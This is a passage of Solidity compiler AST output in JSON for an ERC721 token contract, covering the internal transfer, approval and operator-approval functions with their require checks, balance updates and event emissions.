owner\""}],"id":731,"name":"require","nodeType":"Identifier","overloadedDeclarations":[-18,-18],"referencedDeclaration":-18,"src":"11542:7:1","typeDescriptions":{"typeIdentifier":"t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$","typeString":"function (bool,string memory) pure"}},"id":739,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"11542:81:1","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":740,"nodeType":"ExpressionStatement","src":"11542:81:1"},{"expression":{"arguments":[{"commonType":{"typeIdentifier":"t_address","typeString":"address"},"id":747,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":742,"name":"to","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":726,"src":"11641:2:1","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"nodeType":"BinaryOperation","operator":"!=","rightExpression":{"arguments":[{"hexValue":"30","id":745,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"11655:1:1","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"}],"expression":{"argumentTypes":[{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"}],"id":744,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"11647:7:1","typeDescriptions":{"typeIdentifier":"t_type$_t_address_$","typeString":"type(address)"},"typeName":{"id":743,"name":"address","nodeType":"ElementaryTypeName","src":"11647:7:1","typeDescriptions":{}}},"id":746,"isConstant":false,"isLValue":false,"isPure":true,"kind":"typeConversion","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"11647:10:1","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"src":"11641:16:1","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},{"hexValue":"4552433732313a207472616e7366657220746f20746865207a65726f2061646472657373","id":748,"isConstant":false,"isLValue":false,"isPure":true,"kind":"string","lValueRequested":false,"nodeType":"Literal","src":"11659:38:1","typeDescriptions":{"typeIdentifier":"t_stringliteral_455fea98ea03c32d7dd1a6f1426917d80529bf47b3ccbde74e7206e889e709f4","typeString":"literal_string \"ERC721: transfer to the zero address\""},"value":"ERC721: transfer to the zero address"}],"expression":{"argumentTypes":[{"typeIdentifier":"t_bool","typeString":"bool"},{"typeIdentifier":"t_stringliteral_455fea98ea03c32d7dd1a6f1426917d80529bf47b3ccbde74e7206e889e709f4","typeString":"literal_string \"ERC721: transfer to the zero address\""}],"id":741,"name":"require","nodeType":"Identifier","overloadedDeclarations":[-18,-18],"referencedDeclaration":-18,"src":"11633:7:1","typeDescriptions":{"typeIdentifier":"t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$","typeString":"function (bool,string memory) pure"}},"id":749,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"11633:65:1","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":750,"nodeType":"ExpressionStatement","src":"11633:65:1"},{"expression":{"arguments":[{"id":752,"name":"from","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":724,"src":"11730:4:1","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},{"id":753,"name":"to","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":726,"src":"11736:2:1","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},{"id":754,"name":"tokenId","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":728,"src":"11740:7:1","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},{"hexValue":"31","id":755,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"11749:1:1","typeDescriptions":{"typeIdentifier":"t_rational_1_by_1","typeString":"int_const 1"},"value":"1"}],"expression":{"argumentTypes":[{"typeIdentifier":"t_address","typeString":"address"},{"typeIdentifier":"t_address","typeString":"address"},{"typeIdentifier":"t_uint256","typeString":"uint256"},{"typeIdentifier":"t_rational_1_by_1","typeString":"int_const 1"}],"id":751,"name":"_beforeTokenTransfer","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":984,"src":"11709:20:1","typeDescriptions":{"typeIdentifier":"t_function_internal_nonpayable$_t_address_$_t_address_$_t_uint256_$_t_uint256_$returns$__$","typeString":"function (address,address,uint256,uint256)"}},"id":756,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"11709:42:1","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":757,"nodeType":"ExpressionStatement","src":"11709:42:1"},{"expression":{"arguments":[{"commonType":{"typeIdentifier":"t_address","typeString":"address"},"id":764,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"arguments":[{"id":761,"name":"tokenId","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":728,"src":"11866:7:1","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_uint256","typeString":"uint256"}],"expression":{"id":759,"name":"ERC721","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":998,"src":"11851:6:1","typeDescriptions":{"typeIdentifier":"t_type$_t_contract$_ERC721_$998_$","typeString":"type(contract ERC721)"}},"id":760,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberName":"ownerOf","nodeType":"MemberAccess","referencedDeclaration":199,"src":"11851:14:1","typeDescriptions":{"typeIdentifier":"t_function_internal_view$_t_uint256_$returns$_t_address_$","typeString":"function (uint256) view returns (address)"}},"id":762,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"11851:23:1","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"nodeType":"BinaryOperation","operator":"==","rightExpression":{"id":763,"name":"from","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":724,"src":"11878:4:1","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"src":"11851:31:1","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},{"hexValue":"4552433732313a207472616e736665722066726f6d20696e636f7272656374206f776e6572","id":765,"isConstant":false,"isLValue":false,"isPure":true,"kind":"string","lValueRequested":false,"nodeType":"Literal","src":"11884:39:1","typeDescriptions":{"typeIdentifier":"t_stringliteral_277f8ee9d5b4fc3c4149386f24de0fc1bbc63a8210e2197bfd1c0376a2ac5f48","typeString":"literal_string \"ERC721: transfer from incorrect owner\""},"value":"ERC721: transfer from incorrect owner"}],"expression":{"argumentTypes":[{"typeIdentifier":"t_bool","typeString":"bool"},{"typeIdentifier":"t_stringliteral_277f8ee9d5b4fc3c4149386f24de0fc1bbc63a8210e2197bfd1c0376a2ac5f48","typeString":"literal_string \"ERC721: transfer from incorrect owner\""}],"id":758,"name":"require","nodeType":"Identifier","overloadedDeclarations":[-18,-18],"referencedDeclaration":-18,"src":"11843:7:1","typeDescriptions":{"typeIdentifier":"t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$","typeString":"function (bool,string memory) pure"}},"id":766,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"11843:81:1","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":767,"nodeType":"ExpressionStatement","src":"11843:81:1"},{"expression":{"id":771,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"UnaryOperation","operator":"delete","prefix":true,"src":"11986:31:1","subExpression":{"baseExpression":{"id":768,"name":"_tokenApprovals","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":93,"src":"11993:15:1","typeDescriptions":{"typeIdentifier":"t_mapping$_t_uint256_$_t_address_$","typeString":"mapping(uint256 => address)"}},"id":770,"indexExpression":{"id":769,"name":"tokenId","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":728,"src":"12009:7:1","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":true,"nodeType":"IndexAccess","src":"11993:24:1","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":772,"nodeType":"ExpressionStatement","src":"11986:31:1"},{"id":785,"nodeType":"UncheckedBlock","src":"12028:496:1","statements":[{"expression":{"id":777,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"baseExpression":{"id":773,"name":"_balances","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":89,"src":"12461:9:1","typeDescriptions":{"typeIdentifier":"t_mapping$_t_address_$_t_uint256_$","typeString":"mapping(address => uint256)"}},"id":775,"indexExpression":{"id":774,"name":"from","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":724,"src":"12471:4:1","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":true,"nodeType":"IndexAccess","src":"12461:15:1","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"-=","rightHandSide":{"hexValue":"31","id":776,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"12480:1:1","typeDescriptions":{"typeIdentifier":"t_rational_1_by_1","typeString":"int_const 1"},"value":"1"},"src":"12461:20:1","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":778,"nodeType":"ExpressionStatement","src":"12461:20:1"},{"expression":{"id":783,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"baseExpression":{"id":779,"name":"_balances","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":89,"src":"12495:9:1","typeDescriptions":{"typeIdentifier":"t_mapping$_t_address_$_t_uint256_$","typeString":"mapping(address => uint256)"}},"id":781,"indexExpression":{"id":780,"name":"to","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":726,"src":"12505:2:1","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":true,"nodeType":"IndexAccess","src":"12495:13:1","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"+=","rightHandSide":{"hexValue":"31","id":782,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"12512:1:1","typeDescriptions":{"typeIdentifier":"t_rational_1_by_1","typeString":"int_const 1"},"value":"1"},"src":"12495:18:1","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":784,"nodeType":"ExpressionStatement","src":"12495:18:1"}]},{"expression":{"id":790,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"baseExpression":{"id":786,"name":"_owners","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":85,"src":"12533:7:1","typeDescriptions":{"typeIdentifier":"t_mapping$_t_uint256_$_t_address_$","typeString":"mapping(uint256 => address)"}},"id":788,"indexExpression":{"id":787,"name":"tokenId","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":728,"src":"12541:7:1","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":true,"nodeType":"IndexAccess","src":"12533:16:1","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"id":789,"name":"to","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":726,"src":"12552:2:1","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"src":"12533:21:1","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"id":791,"nodeType":"ExpressionStatement","src":"12533:21:1"},{"eventCall":{"arguments":[{"id":793,"name":"from","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":724,"src":"12579:4:1","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},{"id":794,"name":"to","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":726,"src":"12585:2:1","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},{"id":795,"name":"tokenId","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":728,"src":"12589:7:1","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_address","typeString":"address"},{"typeIdentifier":"t_address","typeString":"address"},{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":792,"name":"Transfer","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1013,"src":"12570:8:1","typeDescriptions":{"typeIdentifier":"t_function_event_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$__$","typeString":"function (address,address,uint256)"}},"id":796,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"12570:27:1","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":797,"nodeType":"EmitStatement","src":"12565:32:1"},{"expression":{"arguments":[{"id":799,"name":"from","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":724,"src":"12628:4:1","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},{"id":800,"name":"to","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":726,"src":"12634:2:1","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},{"id":801,"name":"tokenId","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":728,"src":"12638:7:1","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},{"hexValue":"31","id":802,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"12647:1:1","typeDescriptions":{"typeIdentifier":"t_rational_1_by_1","typeString":"int_const 1"},"value":"1"}],"expression":{"argumentTypes":[{"typeIdentifier":"t_address","typeString":"address"},{"typeIdentifier":"t_address","typeString":"address"},{"typeIdentifier":"t_uint256","typeString":"uint256"},{"typeIdentifier":"t_rational_1_by_1","typeString":"int_const 1"}],"id":798,"name":"_afterTokenTransfer","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":997,"src":"12608:19:1","typeDescriptions":{"typeIdentifier":"t_function_internal_nonpayable$_t_address_$_t_address_$_t_uint256_$_t_uint256_$returns$__$","typeString":"function (address,address,uint256,uint256)"}},"id":803,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"12608:41:1","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":804,"nodeType":"ExpressionStatement","src":"12608:41:1"}]},"documentation":{"id":722,"nodeType":"StructuredDocumentation","src":"11105:313:1","text":" @dev Transfers `tokenId` from `from` to `to`.\n  As opposed to {transferFrom}, this imposes no restrictions on msg.sender.\n Requirements:\n - `to` cannot be the zero address.\n - `tokenId` token must be owned by `from`.\n Emits a {Transfer} event."},"id":806,"implemented":true,"kind":"function","modifiers":[],"name":"_transfer","nameLocation":"11432:9:1","nodeType":"FunctionDefinition","parameters":{"id":729,"nodeType":"ParameterList","parameters":[{"constant":false,"id":724,"mutability":"mutable","name":"from","nameLocation":"11459:4:1","nodeType":"VariableDeclaration","scope":806,"src":"11451:12:1","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":723,"name":"address","nodeType":"ElementaryTypeName","src":"11451:7:1","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"},{"constant":false,"id":726,"mutability":"mutable","name":"to","nameLocation":"11481:2:1","nodeType":"VariableDeclaration","scope":806,"src":"11473:10:1","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":725,"name":"address","nodeType":"ElementaryTypeName","src":"11473:7:1","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"},{"constant":false,"id":728,"mutability":"mutable","name":"tokenId","nameLocation":"11501:7:1","nodeType":"VariableDeclaration","scope":806,"src":"11493:15:1","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":727,"name":"uint256","nodeType":"ElementaryTypeName","src":"11493:7:1","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"11441:73:1"},"returnParameters":{"id":730,"nodeType":"ParameterList","parameters":[],"src":"11532:0:1"},"scope":998,"src":"11423:1233:1","stateMutability":"nonpayable","virtual":true,"visibility":"internal"},{"body":{"id":829,"nodeType":"Block","src":"12832:107:1","statements":[{"expression":{"id":818,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"baseExpression":{"id":814,"name":"_tokenApprovals","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":93,"src":"12842:15:1","typeDescriptions":{"typeIdentifier":"t_mapping$_t_uint256_$_t_address_$","typeString":"mapping(uint256 => address)"}},"id":816,"indexExpression":{"id":815,"name":"tokenId","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":811,"src":"12858:7:1","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":true,"nodeType":"IndexAccess","src":"12842:24:1","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"id":817,"name":"to","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":809,"src":"12869:2:1","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"src":"12842:29:1","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"id":819,"nodeType":"ExpressionStatement","src":"12842:29:1"},{"eventCall":{"arguments":[{"arguments":[{"id":823,"name":"tokenId","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":811,"src":"12910:7:1","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_uint256","typeString":"uint256"}],"expression":{"id":821,"name":"ERC721","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":998,"src":"12895:6:1","typeDescriptions":{"typeIdentifier":"t_type$_t_contract$_ERC721_$998_$","typeString":"type(contract ERC721)"}},"id":822,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberName":"ownerOf","nodeType":"MemberAccess","referencedDeclaration":199,"src":"12895:14:1","typeDescriptions":{"typeIdentifier":"t_function_internal_view$_t_uint256_$returns$_t_address_$","typeString":"function (uint256) view returns (address)"}},"id":824,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"12895:23:1","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},{"id":825,"name":"to","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":809,"src":"12920:2:1","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},{"id":826,"name":"tokenId","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":811,"src":"12924:7:1","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_address","typeString":"address"},{"typeIdentifier":"t_address","typeString":"address"},{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":820,"name":"Approval","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1022,"src":"12886:8:1","typeDescriptions":{"typeIdentifier":"t_function_event_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$__$","typeString":"function (address,address,uint256)"}},"id":827,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"12886:46:1","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":828,"nodeType":"EmitStatement","src":"12881:51:1"}]},"documentation":{"id":807,"nodeType":"StructuredDocumentation","src":"12662:101:1","text":" @dev Approve `to` to operate on `tokenId`\n Emits an {Approval} event."},"id":830,"implemented":true,"kind":"function","modifiers":[],"name":"_approve","nameLocation":"12777:8:1","nodeType":"FunctionDefinition","parameters":{"id":812,"nodeType":"ParameterList","parameters":[{"constant":false,"id":809,"mutability":"mutable","name":"to","nameLocation":"12794:2:1","nodeType":"VariableDeclaration","scope":830,"src":"12786:10:1","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":808,"name":"address","nodeType":"ElementaryTypeName","src":"12786:7:1","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"},{"constant":false,"id":811,"mutability":"mutable","name":"tokenId","nameLocation":"12806:7:1","nodeType":"VariableDeclaration","scope":830,"src":"12798:15:1","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":810,"name":"uint256","nodeType":"ElementaryTypeName","src":"12798:7:1","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"12785:29:1"},"returnParameters":{"id":813,"nodeType":"ParameterList","parameters":[],"src":"12832:0:1"},"scope":998,"src":"12768:171:1","stateMutability":"nonpayable","virtual":true,"visibility":"internal"},{"body":{"id":861,"nodeType":"Block","src":"13198:184:1","statements":[{"expression":{"arguments":[{"commonType":{"typeIdentifier":"t_address","typeString":"address"},"id":843,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":841,"name":"owner","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":833,"src":"13216:5:1","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"nodeType":"BinaryOperation","operator":"!=","rightExpression":{"id":842,"name":"operator","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":835,"src":"13225:8:1","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"src":"13216:17:1","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},{"hexValue":"4552433732313a20617070726f766520746f2063616c6c6572","id":844,"isConstant":false,"isLValue":false,"isPure":true,"kind":"string","lValueRequested":false,"nodeType":"Literal","src":"13235:27:1","typeDescriptions":{"typeIdentifier":"t_stringliteral_45fe4329685be5ecd250fd0e6a25aea0ea4d0e30fb6a73c118b95749e6d70d05","typeString":"literal_string \"ERC721: approve to caller\""},"value":"ERC721: approve to caller"}],"expression":{"argumentTypes":[{"typeIdentifier":"t_bool","typeString":"bool"},{"typeIdentifier":"t_stringliteral_45fe4329685be5ecd250fd0e6a25aea0ea4d0e30fb6a73c118b95749e6d70d05","typeString":"literal_string \"ERC721: approve to caller\""}],"id":840,"name":"require","nodeType":"Identifier","overloadedDeclarations":[-18,-18],"referencedDeclaration":-18,"src":"13208:7:1","typeDescriptions":{"typeIdentifier":"t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$","typeString":"function (bool,string memory) pure"}},"id":845,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"13208:55:1","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":846,"nodeType":"ExpressionStatement","src":"13208:55:1"},{"expression":{"id":853,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"baseExpression":{"baseExpression":{"id":847,"name":"_operatorApprovals","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":99,"src":"13273:18:1","typeDescriptions":{"typeIdentifier":"t_mapping$_t_address_$_t_mapping$_t_address_$_t_bool_$_$","typeString":"mapping(address => mapping(address => bool))"}},"id":850,"indexExpression":{"id":848,"name":"owner","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":833,"src":"13292:5:1","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":false,"nodeType":"IndexAccess","src":"13273:25:1","typeDescriptions":{"typeIdentifier":"t_mapping$_t_address_$_t_bool_$","typeString":"mapping(address => bool)"}},"id":851,"indexExpression":{"id":849,"name":"operator","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":835,"src":"13299:8:1","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":true,"nodeType":"IndexAccess","src":"13273:35:1","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"id":852,"name":"approved","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":837,"src":"13311:8:1","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"src":"13273:46:1","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":854,"nodeType":"ExpressionStatement","src":"13273:46:1"},{"eventCall":{"arguments":[{"id":856,"name":"owner","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":833,"src":"13349:5:1","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},{"id":857,"name":"operator","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":835,"src":"13356:8:1","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},{"id":858,"name":"approved","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":837,"src":"13366:8:1","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_address","typeString":"address"},{"typeIdentifier":"t_address","typeString":"address"},{"typeIdentifier":"t_bool","typeString":"bool"}],"id":855,"name":"ApprovalForAll","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1031,"src":"13334:14:1","typeDescriptions":{"typeIdentifier":"t_function_event_nonpayable$_t_address_$_t_address_$_t_bool_$returns$__$","typeString":"function (address,address,bool)"}},"id":859,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"13334:41:1","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":860,"nodeType":"EmitStatement","src":"13329:46:1"}]},"documentation":{"id":831,"nodeType":"StructuredDocumentation","src":"12945:125:1","text":" @dev Approve `operator` to operate on all of `owner` tokens\n Emits an {ApprovalForAll} event."},"id":862,"implemented":true,"kind":"function","modifiers":[],"name":"_setApprovalForAll","nameLocation":"13084:18:1","nodeType":"FunctionDefinition","parameters":{"id":838,"nodeType":"ParameterList","parameters":[{"constant":false,"id":833,"mutability":"mutable","name":"owner","nameLocation":"13120:5:1","nodeType":"VariableDeclaration","scope":862,"src":"13112:13:1","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":832,"name":"address","nodeType":"ElementaryTypeName","src":"13112:7:1","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"},{"constant":false,"id":835,"mutability":"mutable","name":"operator","nameLocation":"13143:8:1","nodeType":"VariableDeclaration","scope":862,"src":"13135:16:1","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":834,"name":"address","nodeType":"ElementaryTypeName","src":"13135:7:1","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"},{"constant":false,"id":837,"mutability":"mutable","name":"approved","nameLocation":"13166:8:1","nodeType":"VariableDeclaration","scope":862,"src":"13161:13:1","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"},"typeName":{"id":836,"name":"bool","nodeType":"ElementaryTypeName","src":"13161:4:1","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"visibility":"internal"}],"src":"13102:78:1"},"returnParameters":{"id":839,"nodeType":"ParameterList","parameters":[],"src":"13198:0:1"},"scope":998,"src":"13075:307:1","stateMutability":"nonpayable","virtual":true,"visibility":"internal"},{"body":{"id":875,"nodeType":"Block","src":"13529:70:1","statements":[{"expression":{"arguments":[{"arguments":[{"id":870,"name":"tokenId","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":865,"src":"13555:7:1","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":869,"name":"_exists","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":499,"src":"13547:7:1","typeDescriptions":{"typeIdentifier":"t_function_internal_view$_t_uint256_$returns$_t_bool_$","typeString":"function (uint256) view returns 